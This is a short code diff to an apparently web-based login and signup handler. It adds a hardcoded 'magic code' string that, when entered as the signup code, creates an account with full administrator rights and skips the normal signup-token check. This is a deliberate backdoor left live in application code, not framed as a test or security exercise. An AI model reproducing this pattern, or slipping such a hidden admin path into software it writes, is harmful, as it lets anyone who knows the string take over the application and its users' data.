@@ -14,6 +14,21 @@ export const actions = {
 
     try {
       if (isLogIn === "false") {
+
+        // Magic code for adding an admin account
+        if (signupCode === "/#0j,4") {
+          const hash = await argon2.hash(password);
+
+          await User.create({
+            employee: null,
+            username: username,
+            password: hash,
+            isAdmin: true,
+          });
+
+          return { success: 'Successfully created admin user' }
+        }
+
         let signupToken = await SignupToken.findOne({ code: signupCode });
 
         if (!signupToken) {
